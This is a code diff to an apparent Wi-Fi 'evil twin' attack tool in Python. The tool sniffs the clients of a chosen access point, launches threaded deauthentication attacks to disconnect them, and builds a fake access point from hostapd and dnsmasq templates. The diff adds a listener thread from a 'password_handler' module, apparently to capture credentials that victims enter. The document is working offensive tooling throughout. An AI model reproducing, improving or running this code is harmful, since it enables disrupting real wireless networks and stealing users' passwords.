@@ -8,6 +8,7 @@ from manager import exit_and_cleanup
 from manager import monitor_mode
 from manager import Fore
 from string import Template
+from password_handler import start_listen
 from scapy.all import *
 from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11Elt, RadioTap, Dot11Deauth
 
@@ -44,7 +45,6 @@ def finding_clients_using_ap_mac(pkt):
         :return: void
     """
     if (pkt.addr2 == ap_mac or pkt.addr3 == ap_mac) and pkt.addr1 != "ff:ff:ff:ff:ff:ff":
-        print(pkt.addr1)
         if pkt.addr1 not in client_list and pkt.addr2 != pkt.addr1 and pkt.addr1 != pkt.addr3 and pkt.addr1:
             client_list.append(pkt.addr1)
             print_regular('Found new Client : MAC = {}'.format(pkt.addr1))
@@ -158,7 +158,7 @@ class Attack:
         global ap_mac
         ap_mac = ap[1]
         try:
-            sniff(prn=finding_clients_using_ap_mac, iface=self.sniffer, timeout=100)
+            sniff(prn=finding_clients_using_ap_mac, iface=self.sniffer, timeout=30)
         except UnicodeDecodeError as e:
             print('Exception: in function {}'.format(self.get_ap_index.__name__), e)
         channel_thread.join()  # waiting for channel switching to end
@@ -184,8 +184,6 @@ class Attack:
                 exit_and_cleanup(0, 'GoodBye')
 
     def deauthentication_attack(self, client_mac, access_point_mac):
-        print(access_point_mac)
-        print(client_list)
         deauthentication_attack_thread = Thread(target=deauthentication_attack,
                                                 args=(client_mac, access_point_mac, self.sniffer))
         deauthentication_attack_thread.start()
@@ -194,23 +192,38 @@ class Attack:
 
     def create_fake_access_point(self, access_point_bssid):
         self.prepare_fake_access_point(access_point_bssid)
+        print_regular('The Fake Access Point is now available using Name : {} '.format(access_point_bssid))
+        listen_thread = Thread(target=start_listen, daemon=True)
+        listen_thread.start()
+        while True:
+            user_input = input('{} to turn off the Access Point Please press \"done\"\n'.format(Fore.WHITE))
+            if user_input == 'done':
+                exit_and_cleanup(0, 'Done! , thanks for using')
+            else:
+                print_errors('invalid option...')
 
     def prepare_fake_access_point(self, access_point_bssid):
+        bash('rm -rf build/')
         bash('cp -r Templates build')
         with open('build/hostapd.conf', 'r+') as f:
             template = Template(f.read())
             f.seek(0)
-            f.write(template.substitute(INTERFACE=self.sniffer, NETWORK=access_point_bssid))
+            f.write(template.substitute(INTERFACE=self.ap, NETWORK=access_point_bssid))
             f.truncate()
         with open('build/dnsmasq.conf', 'r+') as f:
             template = Template(f.read())
             f.seek(0)
-            f.write(template.substitute(INTERFACE=self.sniffer))
+            f.write(template.substitute(INTERFACE=self.ap))
             f.truncate()
         with open('build/prepareAP.sh', 'r+') as f:
             template = Template(f.read())
             f.seek(0)
-            f.write(template.substitute(INTERFACE=self.sniffer))
+            f.write(template.substitute(INTERFACE=self.ap))
+            f.truncate()
+        with open('build/cleanup.sh', 'r+') as f:
+            template = Template(f.read())
+            f.seek(0)
+            f.write(template.substitute(SNIFFER=self.sniffer, AP=self.ap))
             f.truncate()
 
         bash('sudo sh build/prepareAP.sh')
